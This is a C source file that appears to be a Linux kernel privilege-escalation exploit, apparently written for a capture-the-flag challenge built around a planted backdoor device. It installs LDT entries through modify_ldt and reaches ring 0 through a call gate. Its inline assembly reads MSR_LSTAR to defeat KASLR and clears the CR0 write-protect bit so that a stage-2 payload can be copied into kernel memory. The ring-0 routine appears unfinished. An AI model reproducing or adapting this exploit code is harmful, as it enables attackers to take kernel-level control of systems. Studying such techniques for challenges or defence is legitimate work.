#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <ftw.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

struct segment_descriptor {
    uint16_t limit_low : 16; // Limit bits 0-15
    uint16_t base_low : 16; // Base bits 0-15
    uint8_t base_middle : 8; // Base bits 16-23
    uint8_t type : 4; // Segment type
    uint8_t system_segment : 1; // Descriptor type (0 = system, 1 = code/data)
    uint8_t dpl : 2; // Descriptor Privilege Level
    uint8_t present : 1; // Present bit
    uint8_t limit_high : 4; // Limit bits 16-19
    uint8_t available : 1; // Available for system use
    uint8_t long_mode : 1; // Long mode (64-bit code segment)
    uint8_t default_operation_size : 1; // Default operation size (0 = 16-bit segment, 1 = 32-bit segment)
    uint8_t granularity : 1; // Granularity (0 = byte, 1 = 4KB)
    uint8_t base_high : 8; // Base bits 24-31
};

struct user_desc {
    unsigned int entry_number;
    unsigned int base_addr;
    unsigned int limit;
    unsigned int seg_32bit : 1;
    unsigned int contents : 2;
    unsigned int read_exec_only : 1;
    unsigned int limit_in_pages : 1;
    unsigned int seg_not_present : 1;
    unsigned int useable : 1;
#ifdef __x86_64__
    /*
     * Because this bit is not present in 32-bit user code, user
     * programs can pass uninitialized values here.  Therefore, in
     * any context in which a user_desc comes from a 32-bit program,
     * the kernel must act as though lm == 0, regardless of the
     * actual value.
     */
    unsigned int lm : 1;
#endif
};

struct call_gate_descriptor {
    uint16_t offset_low; // Lower 16 bits of the offset
    uint16_t selector; // Segment selector for the code segment
    uint8_t param_count : 4;
    uint8_t reserved : 4; // Reserved byte (must be 0)
    uint8_t type : 4; // Type (call gate)
    uint8_t s : 1; // Descriptor type (0 = system)
    uint8_t dpl : 2; // Descriptor Privilege Level
    uint8_t present : 1; // Present flag
    uint16_t offset_middle; // Middle 16 bits of the offset
    uint32_t offset_high; // High 32 bits of the offset (if needed)
    uint32_t reserved2; // Reserved (must be 0)
};

// Function to modify LDT
int modify_ldt(int func, void* ptr, unsigned long bytecount)
{
    return syscall(SYS_modify_ldt, func, ptr, bytecount);
}

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

void call_call_gate()
{
    // first qword: unused offset
    // next word: selector
    uint16_t selector[] = { 0, 0, (12 << 3) | (1 << 2) | 0x3 };

    __asm__(
        ".intel_syntax noprefix;"
        "call fword ptr [%0];"
        ".att_syntax prefix;"
        :
        : "r"(selector));
}

#define MSR_LSTAR 0xc0000082
#define KASLR_WRITE_TO 0xfad000

static inline void ring0(){
    __asm__(
        ".intel_syntax noprefix;"
        "cli;"
        "mov ecx, 0xc0000082;"
        "rdmsr;"
        "shl rdx, 32;"
        "or rdx, rax;"
        "sub rdx, 0xe00080;"
        "mov rbp, rdx;"

        // Disable WP
        "mov r8, cr0;"
        "and r8, ~(1 << 16);"
        "mov cr0, r8;"

        // copy stage 2 to the mapped kernel entry point
        "mov rdi, rbp;"
        "add rdi, 0xfad000;"
        ".att_syntax prefix;");
}

int main()
{
    int fd = open("/dev/i_am_definitely_not_backdoor", O_RDWR);
    struct user_desc desc;
    struct segment_descriptor a;
    struct call_gate_descriptor b;

    desc.base_addr = (unsigned int)main ; // Base address
    desc.limit = 0xfff; // Segment limit (4KB)
    desc.seg_32bit = 1; // 32-bit segment
    desc.contents = 2; // code segment
    desc.read_exec_only = 0; // Writable
    desc.limit_in_pages = 0; // Limit is in bytes
    desc.seg_not_present = 0; // Segment present
    desc.useable = 1; // Useable

    desc.base_addr = 0x4f0010; // Base address
    // desc.base_addr = 0x400060; // Base address
    for (int i = 0; i < 17; i++) {
        if (i == 13) continue;
        desc.entry_number = i;
        syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
    }

    write(fd, "a", 1);

    //////////// TEST

    long page_size = 0x10000;

    // Calculate the start of the page containing buf
    void* page_start = 0xc00000;
    
    void *mapped_memory = mmap((void *)page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // memset(page_start, 'a', page_size);
    memcpy(0xc00000, &ring0, 0x2000);
    //////////// TEST

    call_call_gate();

    printf("okokok");
    return 0;
}